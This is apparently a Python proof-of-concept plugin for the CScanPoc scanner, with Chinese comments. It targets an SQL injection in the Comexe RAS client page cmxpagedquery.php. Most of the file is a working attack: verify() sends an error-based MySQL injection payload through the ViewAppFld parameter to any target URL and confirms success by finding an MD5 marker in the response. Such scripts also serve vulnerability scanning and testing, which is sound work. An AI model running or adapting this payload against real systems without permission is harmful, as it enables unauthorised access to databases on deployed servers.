# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Comexe_0006'  # 平台漏洞编号，留空
    name = '科迈RAS标准版客户端页面cmxpagedquery.php注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-09-06'  # 漏洞公布时间
    desc = '''
        科迈RAS 为企业提供了一种从中心点集中管理应用程序远程接入方法。
        科迈RAS标准版客户端页面cmxpagedquery.php注入。 
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0117921'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '科迈RAS系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'fa867b84-bc3c-46bd-9451-353b8288e7cf'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "AppID[-1]=651&clear=%e6%b8%85%e7%a9%ba&NMFind=%e6%90%9c%e7%b4%a2&pageNo=&sort=DisplayName&sortType=A&ViewAppFld=1) AND (SELECT 4511 FROM(SELECT COUNT(*),CONCAT(md5(123),(SELECT (ELT(4511=4511,1))),0x7e7e7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (1461=1461&ViewAppValue=1"
            path = "/server/cmxpagedquery.php?pgid=AppList&SearchFlag=true"
            target = arg+path
            code, head, res, errcode, _ = hh.http(target, payload)
            if code == 302 and '202cb962ac59075b964b07152d234b701' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
